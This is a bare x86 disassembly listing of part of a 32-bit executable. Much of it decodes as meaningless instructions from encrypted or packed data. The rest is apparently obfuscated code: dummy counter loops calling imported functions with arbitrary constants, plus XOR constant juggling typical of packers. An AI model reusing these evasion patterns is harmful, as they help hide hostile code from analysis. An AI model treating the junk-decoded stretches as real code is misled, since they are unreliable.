  40310d:	mov    ecx,DWORD PTR ds:0x44103233
  403113:	xor    cl,ah
  403115:	jge    0x403116
  403117:	(bad)  
  403118:	mov    ds,WORD PTR [ebp-0x14c2ec99]
  40311e:	push   edi
  40311f:	mov    dl,0xe5
  403121:	rcr    DWORD PTR [ebx-0x55],1
  403124:	mov    WORD PTR [eax-0x22],gs
  403127:	out    0x89,eax
  403129:	pop    eax
  40312a:	xchg   DWORD PTR [ebp-0x53a56081],ecx
  403130:	jns    0x40311d
  403132:	or     al,BYTE PTR [esi+0x27]
  403135:	adc    ch,dh
  403137:	test   al,0xaf
  403139:	pop    esi
  40313a:	aam    0xcb
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x5cf93ea4],0x6c
  40315f:	cmp    eax,0x7e7e17ba
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x4031c7
  403169:	es addr16 aaa 
  40316c:	cmp    al,bl
  40316e:	rol    BYTE PTR [esi],1
  403170:	icebp  
  403171:	jo     0x403109
  403173:	je     0x40319c
  403175:	mov    dl,0xb4
  403177:	jne    0x4031bb
  403179:	repz popa 
  40317b:	bnd call 0xa3440987
  403181:	(bad)  
  403182:	jno    0x4031ce
  403184:	repnz stos BYTE PTR es:[edi],al
  403186:	inc    edx
  403187:	scas   al,BYTE PTR es:[edi]
  403188:	mov    eax,0x6aa7a74f
  40318d:	sbb    DWORD PTR [ecx-0x2e],esi
  403190:	xor    al,0x63
  403192:	gs nop
  403194:	bound  edx,QWORD PTR [ecx]
  403196:	cmc    
  403197:	stc    
  403198:	arpl   WORD PTR [ebx-0x735d65df],ax
  40319e:	outs   dx,BYTE PTR ds:[esi]
  40319f:	int3   
  4031a0:	nop
  4031a1:	push   0xffffffb7
  4031a3:	pop    eax
  4031a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a5:	repz sahf 
  4031a7:	popa   
  4031a8:	pop    edi
  4031a9:	dec    esp
  4031aa:	addr16 inc ebp
  4031ac:	js     0x403227
  4031ae:	leave  
  4031af:	dec    esp
  4031b0:	push   edx
  4031b1:	in     al,0x50
  4031b3:	xor    BYTE PTR [ebx],0x34
  4031b6:	sbb    DWORD PTR [esi+ebp*4],ebx
  4031b9:	repnz clc 
  4031bb:	repz push ebx
  4031bd:	xchg   esp,eax
  4031be:	xlat   BYTE PTR ds:[ebx]
  4031bf:	inc    ebp
  4031c0:	fld    DWORD PTR [ebx]
  4031c2:	inc    eax
  4031c3:	jecxz  0x4031a7
  4031c5:	adc    bl,dl
  4031c7:	daa    
  4031c8:	dec    ebp
  4031c9:	mov    ah,0xbe
  4031cb:	jg     0x403205
  4031cd:	xor    BYTE PTR [edx+0x24ad01d2],bh
  4031d3:	jnp    0x403206
  4031d5:	jns    0x40323f
  4031d7:	pop    edi
  4031d8:	or     DWORD PTR [ebx+0x20],esp
  4031db:	sub    al,0xc
  4031dd:	mov    ecx,0x502205a8
  4031e2:	fsubr  st,st(1)
  4031e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e5:	call   0xe2e0d93b
  4031ea:	mov    edi,0x96d125e8
  4031ef:	adc    DWORD PTR [eax+edi*4-0x3a887970],0x0
  4031f7:	outs   dx,BYTE PTR ds:[esi]
  4031f8:	sub    bl,BYTE PTR [ecx+0x6c03834a]
  4031fe:	inc    edi
  4031ff:	sbb    esi,eax
  403201:	push   ss
  403202:	(bad)  
  403203:	retf   
  403204:	arpl   WORD PTR [ebp+esi*2+0x100d0947],dx
  40320b:	iret   
  40320c:	pop    edi
  40320d:	add    cl,dh
  40320f:	fimul  WORD PTR [edi+edi*4+0x6d]
  403213:	je     0x4031fc
  403215:	fs sahf 
  403217:	mov    dl,BYTE PTR [esi]
  403219:	jns    0x403212
  40321b:	add    esi,DWORD PTR [edi]
  40321d:	retf   
  40321e:	sbb    DWORD PTR [esi],edi
  403220:	add    DWORD PTR [esi+0x64],eax
  403223:	cmp    al,0xec
  403225:	addr16 mov eax,ds:0xd23
  403229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322a:	sahf   
  40322b:	leave  
  40322c:	ret    0x48ae
  40322f:	pop    eax
  403230:	sahf   
  403231:	sub    ah,BYTE PTR [ebx-0x5956187f]
  403237:	in     eax,dx
  403238:	add    DWORD PTR [ebx+eax*8+0x52985688],eax
  40323f:	lods   eax,DWORD PTR ds:[esi]
  403240:	(bad)  
  403241:	lds    edi,FWORD PTR [eax-0x68b39997]
  403247:	xorps  xmm1,XMMWORD PTR [ecx+0x1a]
  40324b:	sbb    eax,0x1e42307f
  403250:	retf   0xd9dd
  403253:	stc    
  403254:	out    0x33,al
  403256:	shr    DWORD PTR [eax],1
  403258:	(bad)  
  403259:	mov    esp,?
  40325b:	and    BYTE PTR [edi+0x3802fb1f],dl
  403261:	pop    ds
  403262:	mov    esp,0x194678aa
  403267:	fiadd  DWORD PTR [edx+0x30b05fda]
  40326d:	or     eax,0xd338ed16
  403272:	sti    
  403273:	addr16 (bad) 
  403275:	nop
  403276:	int3   
  403277:	stos   BYTE PTR es:[edi],al
  403278:	mov    edi,DWORD PTR [ebx-0x11]
  40327b:	jmp    0x4032f0
  40327d:	cld    
  40327e:	idiv   eax
  403280:	rol    BYTE PTR [eax+0x21],1
  403283:	sti    
  403284:	mov    edx,0xc3f107f6
  403289:	cmp    al,0x5
  40328b:	mov    ebx,0xff56407d
  403290:	minps  xmm4,XMMWORD PTR [edx-0x21602fb4]
  403297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403298:	inc    ebx
  403299:	shl    DWORD PTR [edx*2-0x1a14da89],1
  4032a0:	mov    ebp,0x6a7b2066
  4032a5:	popa   
  4032a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a7:	(bad)  
  4032a8:	sbb    BYTE PTR ds:[edi-0x70],0xf9
  4032ad:	out    dx,eax
  4032ae:	mov    edx,0x38f8cb75
  4032b3:	enter  0x54af,0xf3
  4032b7:	test   BYTE PTR ds:0x1990fb6e,bh
  4032bd:	sahf   
  4032be:	push   edi
  4032bf:	add    esi,DWORD PTR [eax+0x2d]
  4032c2:	test   al,0xa6
  4032c4:	es xchg ecx,eax
  4032c6:	std    
  4032c7:	(bad)  
  4032c8:	ss ja  0x403343
  4032cb:	adc    esi,DWORD PTR [ebx-0x1fea1149]
  4032d1:	clc    
  4032d2:	imul   esi,DWORD PTR [ebp*4-0xa99291a],0x37d92487
  4032dd:	clc    
  4032de:	sbb    al,dh
  4032e0:	xor    DWORD PTR [ebp-0x69],ecx
  4032e3:	pop    esp
  4032e4:	or     ebp,DWORD PTR [ebp+ecx*1-0x53dacc93]
  4032eb:	add    BYTE PTR [esi+0x5b],bl
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x6f362b76]
  403537:	out    dx,al
  403538:	test   dh,0x15
  40353b:	jle    0x4035bb
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x4034d3
  403542:	jecxz  0x403570
  403544:	rep outs dx,DWORD PTR ds:[esi]
  403546:	arpl   WORD PTR [esi+ebp*1-0x59ebcfea],di
  40354d:	les    edx,FWORD PTR [edi+0x5d]
  403550:	push   0x3da1356a
  403555:	stos   DWORD PTR es:[edi],eax
  403556:	xor    ecx,DWORD PTR [ecx+0x23]
  403559:	out    0xc5,eax
  40355b:	fld    QWORD PTR [ebp-0x46]
  40355e:	add    cl,ch
  403560:	and    al,0x56
  403562:	(bad)  
  403563:	jecxz  0x4034f8
  403565:	into   
  403566:	ss cwde 
  403568:	xor    edi,DWORD PTR [ebp+edx*4-0x7523ba89]
  40356f:	sti    
  403570:	add    al,0x29
  403572:	pop    es
  403573:	sbb    BYTE PTR [esi],cl
  403575:	leave  
  403576:	jmp    0x4a87:0xe04b0b5e
  40357d:	fnstcw WORD PTR [edi-0xd]
  403580:	aas    
  403581:	rol    DWORD PTR [edi],cl
  403583:	cld    
  403584:	xor    bh,BYTE PTR [esp+eax*4]
  403587:	mov    edi,DWORD PTR ds:0xf6c2293b
  40358d:	imul   ecx,DWORD PTR [edi-0xc],0x2c
  403591:	inc    edi
  403592:	arpl   WORD PTR [esi],bp
  403594:	push   ebx
  403595:	sbb    DWORD PTR [eax+ebp*4-0x52],esp
  403599:	and    esi,DWORD PTR [edi+0x6d]
  40359c:	out    dx,al
  40359d:	adc    DWORD PTR [esi+eax*1-0x4bc1054f],ecx
  4035a4:	jge    0x4035d9
  4035a6:	outs   dx,BYTE PTR ds:[esi]
  4035a7:	in     al,0x25
  4035a9:	leave  
  4035aa:	jno    0x4035b7
  4035ac:	pop    ds
  4035ad:	pop    eax
  4035ae:	or     DWORD PTR [edx],0xfffffffe
  4035b1:	jp     0x40359a
  4035b3:	xchg   esp,eax
  4035b4:	fisub  DWORD PTR [edi]
  4035b6:	sbb    DWORD PTR [ecx+0x61],esp
  4035b9:	lock clc 
  4035bb:	gs mov esi,0x195e38fd
  4035c1:	ror    DWORD PTR [esi-0x155765ba],1
  4035c7:	jno    0x4035d4
  4035c9:	jmp    0xe0dc:0x5255c805
  4035d0:	test   BYTE PTR [ecx],ah
  4035d2:	adc    esp,DWORD PTR [esi-0x5bc9c969]
  4035d8:	shr    DWORD PTR [edx+edi*4+0x172c95e7],cl
  4035df:	push   ss
  4035e0:	inc    edi
  4035e1:	add    BYTE PTR [edi],dl
  4035e3:	sbb    al,0xea
  4035e5:	sbb    esp,ecx
  4035e7:	aaa    
  4035e8:	xchg   esi,eax
  4035e9:	shl    DWORD PTR ds:0xedd1cf75,cl
  4035ef:	daa    
  4035f0:	xchg   ebx,eax
  4035f1:	pushf  
  4035f2:	sub    bh,bl
  4035f4:	push   ss
  4035f5:	cwde   
  4035f6:	sub    eax,DWORD PTR [esi]
  4035f8:	scas   al,BYTE PTR es:[edi]
  4035f9:	push   edi
  4035fa:	add    BYTE PTR [ebx+eax*4+0x51],0x7b
  4035ff:	fld    TBYTE PTR [ecx+0x6d5a52c]
  403605:	fnsave [ecx]
  403607:	popa   
  403608:	mov    ch,BYTE PTR [esi-0x13d46d8]
  40360e:	sbb    ah,BYTE PTR [edx+0x11]
  403611:	(bad)  
  403612:	repz dec ecx
  403615:	sub    edx,esi
  403617:	mov    ecx,0xacc121e
  40361c:	ins    BYTE PTR es:[edi],dx
  40361d:	or     BYTE PTR [esi+0x6b],ch
  403620:	push   edi
  403621:	or     BYTE PTR [ecx],ah
  403623:	frstor [eax+edx*4-0x2840928]
  40362a:	cmp    BYTE PTR [esi-0x183d6c21],dl
  403630:	rcl    DWORD PTR [edi+0x7d350f11],cl
  403636:	xor    DWORD PTR gs:[esi-0xf388e27],esi
  40363d:	pop    ecx
  40363e:	rcr    bl,1
  403640:	dec    ebp
  403641:	cmp    ecx,ebp
  403643:	dec    eax
  403644:	mov    bx,0x8f60
  403648:	sub    DWORD PTR [eax+0x7fea6e4d],0x74
  40364f:	mov    dl,0xe2
  403651:	adc    al,0xd4
  403653:	mov    ecx,0x50144af3
  403658:	shr    DWORD PTR [esp+eax*8-0x11],0xf6
  40365d:	and    eax,0xe88473e5
  403662:	mov    cl,0x91
  403664:	cmc    
  403665:	cmp    bh,cl
  403667:	pop    ds
  403668:	cmp    ah,BYTE PTR [ecx-0x76fdb749]
  40366e:	sbb    esi,esi
  403670:	mov    eax,ds:0x3ce43d26
  403675:	mov    bl,0x51
  403677:	xchg   edx,eax
  403678:	mov    al,ds:0x5edb1230
  40367d:	fisttp DWORD PTR [ebp-0x7ba58578]
  403683:	cmp    ebp,edx
  403685:	sti    
  403686:	aad    0xc5
  403688:	out    dx,eax
  403689:	pop    ecx
  40368a:	mov    ds:0xa1772893,eax
  40368f:	popf   
  403690:	mov    esi,0x5161a21c
  403695:	fstp   DWORD PTR [edi+0x2c]
  403698:	push   ebp
  403699:	sbb    al,0x42
  40369b:	fmul   DWORD PTR [ebp+0x3481db5b]
  4036a1:	fidiv  WORD PTR [eax+eiz*8-0x3f]
  4036a5:	jg     0x40368d
  4036a7:	out    dx,al
  4036a8:	pop    edi
  4036a9:	repz addr16 inc esp
  4036ac:	or     al,0x83
  4036ae:	loopne 0x403646
  4036b0:	mov    ebp,0x624e66c5
  4036b5:	ret    0x7f0c
  4036b8:	jge    0x403667
  4036ba:	mov    ds:0xd521ed75,eax
  4036bf:	dec    ebx
  4036c0:	xor    ebx,DWORD PTR [eax-0x99e90dc]
  4036c6:	inc    edi
  4036c7:	cmp    ebx,ebx
  4036c9:	jmp    0x40364b
  4036cb:	dec    edi
  4036cc:	leave  
  4036cd:	adc    al,0x6d
  4036cf:	test   ah,al
  4036d1:	cmp    BYTE PTR [ebx+0x13bbfa91],ah
  4036d7:	sub    ah,BYTE PTR cs:[esi+0x59ad7800]
  4036de:	and    eax,0x53e8faab
  4036e3:	popf   
  4036e4:	dec    esp
  4036e5:	adc    eax,0x6181605d
  4036ea:	jmp    0x3587:0xe2db313c
  4036f1:	or     DWORD PTR [esi-0x4fdf8ed],ebp
  4036f7:	jnp    0x4036d2
  4036f9:	ds out 0xb3,al
  4036fc:	sahf   
  4036fd:	jp     0x403746
  4036ff:	mov    edx,DWORD PTR ds:0xf6195ca3
  403705:	adc    ebp,edi
  403707:	mov    esi,0xef5fad29
  40370c:	das    
  40370d:	addr16 jne 0x40370e
  403710:	sub    BYTE PTR [eax+0x1e56ffe0],dl
  403716:	int    0x83
  403718:	test   DWORD PTR [esi+0x58610340],esp
  40371e:	mov    bl,0x44
  403720:	push   0xd3eabbb6
  403725:	(bad)  
  403726:	in     al,dx
  403727:	loopne 0x403794
  403729:	fcom   QWORD PTR [ebx]
  40372b:	push   cs
  40372c:	scas   al,BYTE PTR es:[edi]
  40372d:	inc    eax
  40372e:	ja     0x40378c
  403730:	add    ebp,DWORD PTR [edx]
  403732:	xor    DWORD PTR [ebx+0x3b],ebp
  403735:	pop    edx
  403736:	das    
  403737:	clc    
  403738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403739:	or     eax,0x5fee7435
  40373e:	lds    ebx,FWORD PTR [eax]
  403740:	inc    esi
  403741:	call   0x36c6:0xa05c1a39
  403748:	mov    esi,DWORD PTR [edx+0x783b8382]
  40374e:	(bad)  
  40374f:	(bad)  
  403750:	sub    al,BYTE PTR [ebx-0x1939d20f]
  403756:	or     dh,BYTE PTR [ebp+0x2cf23912]
  40375c:	shl    dl,cl
  40375e:	fdivr  DWORD PTR [edx-0x312b004b]
  403764:	add    al,0xb8
  403766:	inc    esp
  403767:	(bad)  
  403768:	(bad)  
  403769:	(bad)  
  40376a:	fild   QWORD PTR [ecx+0x71a8afcb]
  403770:	sbb    esi,edi
  403772:	lods   al,BYTE PTR ds:[esi]
  403773:	leave  
  403774:	leave  
  403775:	sbb    BYTE PTR [esi+0x929a57e],0x1e
  40377c:	test   eax,0x9868bcd1
  403781:	hlt    
  403782:	das    
  403783:	arpl   dx,sp
  403785:	dec    esp
  403786:	xor    eax,0xed4d3044
  40378b:	dec    ecx
  40378c:	ror    DWORD PTR [edi],1
  40378e:	xchg   ecx,eax
  40378f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403790:	shl    dh,1
  403792:	mov    eax,ds:0x64f7c581
  403797:	fwait
  403798:	dec    esp
  403799:	mov    ecx,0x1a7fae04
  40379e:	push   esp
  40379f:	inc    ebx
  4037a0:	add    ah,ah
  4037a2:	sub    DWORD PTR [esi-0x9],0xb40b0e54
  4037a9:	mov    dh,0xa1
  4037ab:	xor    edx,DWORD PTR [ebx]
  4037ad:	enter  0x51,0x1a
  4037b1:	cld    
  4037b2:	aas    
  4037b3:	push   0x72024505
  4037b8:	add    eax,0x1e192be
  4037bd:	xor    eax,0x3d7c0f1d
  4037c2:	xchg   ecx,eax
  4037c3:	imul   ebx,DWORD PTR [ebx+0x12e16a16],0xffffffda
  4037ca:	retf   
  4037cb:	sbb    ebp,ecx
  4037cd:	popf   
  4037ce:	stos   BYTE PTR es:[edi],al
  4037cf:	mul    DWORD PTR [ebp-0x7af2cc37]
  4037d5:	and    eax,0xc27eb80a
  4037da:	into   
  4037db:	mov    DWORD PTR [esi-0xaca4d80],esp
  4037e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e2:	xchg   esi,edx
  4037e4:	(bad)  
  4037e5:	out    0x71,eax
  4037e7:	aaa    
  4037e8:	fadd   QWORD PTR [edi-0x435c06fa]
  4037ee:	pop    es
  4037ef:	push   ecx
  4037f0:	xchg   edi,eax
  4037f1:	in     eax,dx
  4037f2:	push   ebp
  4037f3:	in     eax,0x25
  4037f5:	pop    esi
  4037f6:	or     ecx,DWORD PTR [ebx+ecx*1]
  4037f9:	sub    DWORD PTR [edi-0x462eb22c],0x2f
  403800:	dec    esp
  403801:	mov    ah,BYTE PTR ds:0x6de46894
  403807:	ret    
  403808:	add    al,0x44
  40380a:	jp     0x4037cf
  40380c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40380d:	adc    BYTE PTR [ecx],0x27
  403810:	xor    al,0x66
  403812:	sbb    eax,0x7bc2f1c5
  403817:	mov    esp,0xd7e2bec0
  40381c:	bound  edi,QWORD PTR [ecx+0x7a97d9e3]
  403822:	push   ds
  403823:	stos   DWORD PTR es:[edi],eax
  403824:	xchg   ebp,eax
  403825:	jb     0x40389e
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43377b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43382b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4338a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403abd
  403acb:	sub    ecx,0x61
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403ac2
  403ad7:	and    al,0x33
  403ad9:	test   DWORD PTR [esi-0x174e78a4],0x5aaf4465
  403ae3:	outs   dx,DWORD PTR ds:[esi]
  403ae4:	lock adc al,0x4f
  403ae7:	pop    eax
  403ae8:	rcr    DWORD PTR [ebx],1
